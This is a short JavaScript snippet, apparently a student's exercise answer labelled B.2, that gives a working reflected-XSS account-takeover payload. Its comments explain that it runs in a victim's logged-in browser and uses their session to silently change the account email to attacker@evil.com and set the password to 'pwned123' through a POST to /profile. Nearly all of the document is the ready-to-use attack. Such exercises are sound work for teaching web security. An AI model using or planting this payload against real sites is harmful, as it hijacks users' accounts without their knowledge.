// B.2 reflected-XSS account-takeover payload (student 27052524)
// Runs in the victim's logged-in browser; uses their session cookie to
// silently change their profile email + password to the attacker's.
fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=attacker@evil.com&password=pwned123"
});
